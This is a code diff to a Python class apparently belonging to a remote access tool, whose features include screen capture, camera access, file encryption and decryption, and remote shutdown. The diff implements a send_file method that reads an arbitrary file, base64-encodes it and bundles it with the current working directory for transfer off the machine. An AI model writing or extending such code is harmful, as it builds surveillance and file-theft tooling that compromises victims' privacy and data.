@@ -1,6 +1,7 @@
 import io
 import os
 import cv2
+import base64
 import subprocess
 from PIL import ImageGrab
 from datetime import datetime
@@ -29,8 +30,15 @@ class GeneralFeatures:
         return buf.getvalue()
 
 
-    def send_file(self):
-        pass
+    def send_file(self, filename):
+        with open(filename, 'rb') as f:
+            file_data = f.read()
+            print(file_data)
+        return {
+            'file': base64.b64encode(file_data).decode(),
+            'filename': os.path.basename(filename),
+            'cwd': os.getcwd()
+        }
 
 
     def receive_file(self):
@@ -95,10 +103,7 @@ class GeneralFeatures:
         except InvalidTag:
             raise ValueError("Wrong password or corrupted file")
         # Remove "(Encrypted)_"
-        out_filename = os.path.join(
-            os.path.dirname(filename),
-            os.path.basename(filename).removeprefix("(Encrypted)_")
-        )
+        out_filename = os.path.join(os.path.dirname(filename),os.path.basename(filename).removeprefix("(Encrypted)_"))
         with open(out_filename, 'wb') as f:
             f.write(plaintext)
         os.remove(filename)
@@ -121,7 +126,4 @@ class GeneralFeatures:
             return "[+] System shutting down..."
         except Exception as e:
             return f"[-] Shutdown failed: {e}"
-
-
-
 
